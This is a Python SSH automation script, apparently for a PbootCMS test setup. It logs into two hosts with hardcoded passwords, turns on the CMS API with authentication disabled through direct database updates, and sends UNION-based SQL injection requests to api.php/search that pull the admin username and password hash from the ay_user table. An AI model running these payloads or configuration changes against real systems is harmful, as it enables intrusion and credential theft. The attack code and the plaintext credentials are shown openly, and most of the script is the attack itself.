#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Enable API on A1 PbootCMS, fix admin password, test SQLi"""
import paramiko
import sys

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

user = 'gdadmin'
pwd = 'Gdadmin@123'
cms_user = 'cmsuser'
cms_pass = 'Cm5Us3r@2024!'

def run(ssh, cmd, timeout=30):
    print(f">>> {cmd[:150]}")
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode('utf-8', errors='replace')
    err = stderr.read().decode('utf-8', errors='replace')
    ec = stdout.channel.recv_exit_status()
    if out.strip():
        try:
            print(f"  {out.strip()[:2000]}")
        except:
            print(f"  [output {len(out.strip())} chars]")
    if err.strip() and ec != 0:
        try:
            print(f"  [err] {err.strip()[:300]}")
        except:
            print(f"  [err suppressed]")
    return out, err, ec

# ============================================================
# 1. Check encrypt_string function
# ============================================================
print("="*60)
print("1. FIND encrypt_string FUNCTION")
print("="*60)
c1 = paramiko.SSHClient()
c1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c1.connect('192.168.100.1', username=user, password=pwd, timeout=10)

run(c1, "grep -rn 'function encrypt_string\|encrypt_string\|password.*encrypt' /var/www/cms/core/ 2>/dev/null | head -20")
run(c1, "grep -rn 'function encrypt_string\|encrypt_string' /var/www/cms/apps/ 2>/dev/null | head -20")
run(c1, "grep -rn 'encrypt_string' /var/www/cms/core/ 2>/dev/null | head -20")

# ============================================================
# 2. Enable API by updating database
# ============================================================
print("\n" + "="*60)
print("2. ENABLE API")
print("="*60)
c2 = paramiko.SSHClient()
c2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c2.connect('192.168.100.2', username=user, password=pwd, timeout=10)

run(c2, f"mysql -u {cms_user} -p'{cms_pass}' -h localhost -e \"UPDATE cms.ay_config SET value='1' WHERE name='api_open';\" 2>&1")
run(c2, f"mysql -u {cms_user} -p'{cms_pass}' -h localhost -e \"UPDATE cms.ay_config SET value='0' WHERE name='api_auth';\" 2>&1")
run(c2, f"mysql -u {cms_user} -p'{cms_pass}' -h localhost -e \"SELECT name,value FROM cms.ay_config WHERE name IN ('api_open','api_auth');\" 2>&1")

# ============================================================
# 3. Test SQLi endpoint
# ============================================================
print("\n" + "="*60)
print("3. TEST SQLi ENDPOINT")
print("="*60)

# Normal search
run(c1, "curl -s 'http://localhost/api.php/search?keyword=test' 2>&1")
# SQLi probe - should trigger SQL error
run(c1, "curl -s \"http://localhost/api.php/search?keyword=test'\" 2>&1")
# UNION based SQLi test
run(c1, "curl -s \"http://localhost/api.php/search?keyword=test' UNION SELECT 1,2,3,4-- \" 2>&1")
# Extract admin hash
run(c1, "curl -s \"http://localhost/api.php/search?keyword=test' UNION SELECT 1,username,password,4 FROM ay_user WHERE id=1-- \" 2>&1")
# Try from ay_user where username='admin'
run(c1, "curl -s \"http://localhost/api.php/search?keyword=test' UNION SELECT 1,username,password,4 FROM ay_user WHERE username=0x61646d696e-- \" 2>&1")

# ============================================================
# 4. Check the encrypt_string definition
# ============================================================
print("\n" + "="*60)
print("4. DECODE encrypt_string")
print("="*60)
run(c1, "grep -A 10 'function encrypt_string' /var/www/cms/core/function/helper.php 2>/dev/null || grep -rn 'function encrypt_string' /var/www/cms/ 2>/dev/null | head -5")

# ============================================================
# 5. Fix admin password using PHP
# ============================================================
print("\n" + "="*60)
print("5. FIX ADMIN PASSWORD VIA PHP")
print("="*60)
# Generate the correct password hash using PbootCMS's own encrypt_string
# First find the function
run(c1, "grep -rn 'function encrypt_string' /var/www/cms/ 2>/dev/null")
# Try core functions
run(c1, "ls /var/www/cms/core/function/")

c1.close()
c2.close()
print("\nDone!")
